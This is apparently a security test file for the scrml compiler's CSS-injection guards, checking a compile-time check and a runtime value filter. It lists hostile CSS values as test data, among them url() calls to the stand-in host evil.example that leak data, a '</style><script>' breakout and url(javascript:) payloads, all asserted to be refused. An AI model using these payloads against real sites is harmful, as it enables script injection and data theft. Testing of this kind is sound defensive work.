// css-injection-pack-s469.test.js — s469-boot-css: the CSS-INJECTION security pack for the bootstrap.
//
// SCOPE (narrowed, review F4): this pack covers the `#{}` STYLESHEET only. The only data that reaches a
// `#{}` sheet is a cell's value, through the §25.7 bridge: a `#{}` value's `@cell` prints as
// `var(--scrml-cell)` and the runtime writes the cell's value to that custom property on `:root`
// (`rt.cssVar`). Everything else in a sheet is the author's literal source, checked at compile time.
// NOT covered: a bound `style=(@c)` attribute, which today writes the cell's whole value into `style`
// with no CSS guard — docs/known-gaps.md `g-bootstrap-style-attr-bound-value-unguarded-s469`.
// So the pack attacks the two walls of the `#{}` path:
//
//   WALL 1 — compile time (css-syntax.scrml): the sheet is printed inside the page's `<style>`, a
//   raw-text element only `</style` can end. Every `<` in a `#{}` block — selector, value, string —
//   is E-CSS-SYNTAX, and `${…}` (a runtime string spliced into CSS text) is refused by name. A second
//   wall behind it: html.scrml `HStyle` re-encodes any `<` that reached the printer as `\3c `.
//
//   WALL 2 — run time (runtime.js `cssValueOf`): a cell's value is written only if it is a finite
//   number or a string over a small CSS-value alphabet whose every function is a colour / math
//   function. A refused value REMOVES the property (fail closed — the `var()` falls back to the
//   property's unset value) and is reported without echoing the value.
//
// Each shape is one hostile cell value (or one hostile source). A shape FAILS the pack when the hostile
// text reaches the custom property, the page's `<style>`, or the DOM as markup.

import { describe, test, expect, beforeAll, afterEach, spyOn } from "bun:test";
import { loadM2, frontEnd } from "./harness.js";
import { loadProgram, click, expectNoPageErrors } from "../slice-m1/load-program.js";

let mods;
beforeAll(() => { ({ mods } = loadM2()); }, { timeout: 120000 });
afterEach(() => expectNoPageErrors());

const run = (src) => frontEnd(mods, [{ path: "x.scrml", src }]);

// The runtime guard, imported directly (the same module every loaded program imports a copy of).
const rt = await import("../slice-m1/runtime/runtime.js");

// ---------------------------------------------------------------------------
// WALL 2 — the value guard, shape by shape.
// ---------------------------------------------------------------------------
const HOSTILE = [
  // declaration / rule / element breakouts
  ["`;` then a new declaration", "red; background: url(https://evil.example/x)"],
  ["`}` closing the rule, a new rule", "red } body { display: none"],
  ["`{` opening a block", "red { x"],
  ["`</style>` element breakout", "red</style><script>window.pwned=1</script>"],
  ["`<` alone", "<"],
  ["`>` alone", "a > b"],
  // fetches and script-bearing functions
  ["url(javascript:)", "url(javascript:alert(1))"],
  ["url() exfiltration", "url(https://evil.example/leak?c=1)"],
  ["URL( upper-case", "URL(https://evil.example/)"],
  ["url( with spaces", "url (https://evil.example/)"],
  ["image-set()", "image-set(x 1x)"],
  ["image()", "image(x)"],
  ["src()", "src(x)"],
  ["attr()", "attr(data-x)"],
  ["element()", "element(x)"],
  ["expression() (legacy IE)", "expression(alert(1))"],
  ["var() indirection", "var(--other)"],
  ["env()", "env(safe-area-inset-top)"],
  ["a bare grouping `(` at the top", "(red)"],
  ["an unknown function", "foo(1)"],
  ["a function smuggled in calc", "calc(url(x))"],
  ["unbalanced `(`", "calc(1px"],
  ["unbalanced `)`", "1px)"],
  // escapes, strings, comments, priority
  ["a CSS escape spelling `url`", "\\75 rl(x)"],
  ["a backslash", "a\\b"],
  ["a double-quoted string", "\"x\""],
  ["a single-quoted string", "'x'"],
  ["a comment opener", "red /* x"],
  ["a comment closer", "red */"],
  ["!important", "red !important"],
  ["`@` (an at-rule)", "@import x"],
  ["a newline", "red\nblue"],
  ["a tab", "red\tblue"],
  ["a NUL", "red\u0000"],
  ["non-ASCII look-alike", "ｕｒｌ(x)"],
  ["over-long", "a".repeat(257)],
];
const NON_VALUES = [
  ["NaN", NaN], ["Infinity", Infinity], ["true", true], ["null", null], ["undefined", undefined],
  ["an object", { toString: () => "url(x)" }], ["an array", ["red"]],
];
const ADMITTED = [
  ["a keyword colour", "red", "red"], ["a hex colour", "#0f172a", "#0f172a"], ["a length", "16px", "16px"],
  ["a percentage", "50%", "50%"], ["a font list", "Georgia, serif", "Georgia, serif"],
  ["rgb()", "rgb(1, 2, 3)", "rgb(1, 2, 3)"], ["hsl() with slash alpha", "hsl(10 20% 30% / 0.5)", "hsl(10 20% 30% / 0.5)"],
  ["calc() with grouping", "calc((1px + 2px) * 2)", "calc((1px + 2px) * 2)"], ["clamp()", "clamp(1rem, 2vw, 3rem)", "clamp(1rem, 2vw, 3rem)"],
  ["a number", 3, "3"], ["a negative float", -1.5, "-1.5"], ["the empty string", "", ""],
];

describe("WALL 2 — cssValueOf refuses every hostile value (fail closed)", () => {
  for (const [name, v] of HOSTILE) {
    test(name, () => { expect(rt.cssValueOf(v)).toBeNull(); });
  }
  for (const [name, v] of NON_VALUES) {
    test(`a non-text value: ${name}`, () => { expect(rt.cssValueOf(v)).toBeNull(); });
  }
  for (const [name, v, want] of ADMITTED) {
    test(`admitted: ${name}`, () => { expect(rt.cssValueOf(v)).toBe(want); });
  }
});

// ---------------------------------------------------------------------------
// WALL 2, end to end: a compiled program whose cell takes the hostile value at run time.
// ---------------------------------------------------------------------------
const GUARD_REPORT = "[scrml css-guard] refused a value for --scrml-c: only a finite number, or a plain CSS value (no url(), quotes, escapes, ; { } < or !), reaches CSS (SPEC §25.7). The property was removed.";
const BRIDGE = (value) => `<program>
    let <c:string="teal"/>
    #{ #t { color: @c; } }
    <main>
        <p id="t">t</p>
        <button id="go" onclick=(@c = ${JSON.stringify(value)})>go</button>
    </main>
</program>
`;

describe("WALL 2 end to end — the hostile value never reaches :root (the property is removed and reported)", () => {
  for (const [name, v] of HOSTILE.filter(([, v]) => !v.includes("\u0000") && !v.includes("\n") && !v.includes("\t"))) {
    test(name, async () => {
      const r = run(BRIDGE(v));
      // every shape is an ordinary string written to the cell at run time: it compiles, so the run-time wall is what is tested
      expect(r.diags).toEqual([]);
      const warn = spyOn(console, "warn").mockImplementation(() => {});
      try {
        await loadProgram(r.core, "css-inj", []);
        const root = document.documentElement.style;
        expect(root.getPropertyValue("--scrml-c")).toBe("teal");
        click(document.querySelector("#go"));
        expect(root.getPropertyValue("--scrml-c")).toBe("");
        expect(warn.mock.calls.length).toBe(1);
        // the report is the guard's fixed text — it never echoes the value
        expect(String(warn.mock.calls[0][0])).toBe(GUARD_REPORT);
        expect(window.pwned).toBeUndefined();
        expect(document.querySelector("script:not([type])")).toBeNull();
      } finally {
        warn.mockRestore();
      }
    });
  }
});

// ---------------------------------------------------------------------------
// WALL 1 — compile time: nothing hostile in a `#{}` block reaches the page.
// ---------------------------------------------------------------------------
const SOURCE = [
  ["`</style>` in a string", `p::before { content: "</style><script>window.pwned=1</script>"; }`, "E-CSS-SYNTAX"],
  ["`</style>` in a selector", `p</style><script>x { color: red; }`, "E-CSS-SYNTAX"],
  ["`<!--` in a value", `p { color: <!-- red; }`, "E-CSS-SYNTAX"],
  ["`</STYLE` upper-case in a url", `p { background: url(</STYLE>); }`, "E-CSS-SYNTAX"],
  ["`${…}` splicing a cell into CSS text", `p { color: \${@c}; }`, "E-CSS-SYNTAX"],
  ["`${…}` in a selector", `\${@c} { color: red; }`, "E-CSS-SYNTAX"],
  // review F1: a `/*` INSIDE a string is string text — it must not hide the `<` behind it
  ["`/*` in a string hiding `</style>` (content)", `p::before { content: "/*</style><script>window.pwned=1</script>*/"; }`, "E-CSS-SYNTAX"],
  ["`/*` in an attribute-selector string", `a[title="/*</style>*/"] { color: red; }`, "E-CSS-SYNTAX"],
  ["`/*` in an @import string", `@import "/*</style>*/";`, "E-CSS-SYNTAX"],
  ["`/*` in a custom property's string", `p { --x: "/*</style>*/"; }`, "E-CSS-SYNTAX"],
  ["`/*` in a §25.2 definition's string", `p { x = "/*</style>*/"; }`, "E-CSS-SYNTAX"],
  ["`</style>` after an unclosed comment", `p { color: red; } /* </style>`, "E-CSS-SYNTAX"],
  ["`/*` in a flat block's string", `content: "/*</style>*/";`, "E-CSS-SYNTAX"],
  ["`<` in a `//` comment's neighbour line", `p { color: red; } // ok\n p::after { content: "</style>"; }`, "E-CSS-SYNTAX"],
  ["`!important`", `p { color: red !important; }`, "E-BOOTSTRAP-UNSUPPORTED"],
];

describe("WALL 1 — a hostile `#{}` source is refused, never printed", () => {
  for (const [name, css, code] of SOURCE) {
    test(name, () => {
      const r = run(`<program>\n    let <c:string="x"/>\n    #{ ${css} }\n    <main><p>x</p></main>\n</program>\n`);
      expect(r.diags.map((d) => d.code)).toContain(code);
      expect(r.core == null).toBe(true);
    });
  }
  test("the printed `<style>` holds exactly one `</style` — its own closer — and a `>` combinator stays a combinator", () => {
    const r = run(`<program>\n    #{ .a > .b { content: "\\3c /style>"; } }\n    <main><p>x</p></main>\n</program>\n`);
    expect(r.diags).toEqual([]);
    const html = mods.print.printProgram(r.core, "x.client.js", "scrml-runtime.js").html;
    expect(html.match(/<\/style/gi).length).toBe(1);
    expect(html).toContain(".a > .b");
  });
  test("the second wall: HStyle re-encodes a `<` that reached the printer as the CSS escape `\\3c `", () => {
    expect(mods.html.printNode({ variant: "HStyle", data: { text: "a</style>" } })).toBe("a\\3c /style>");
  });
});
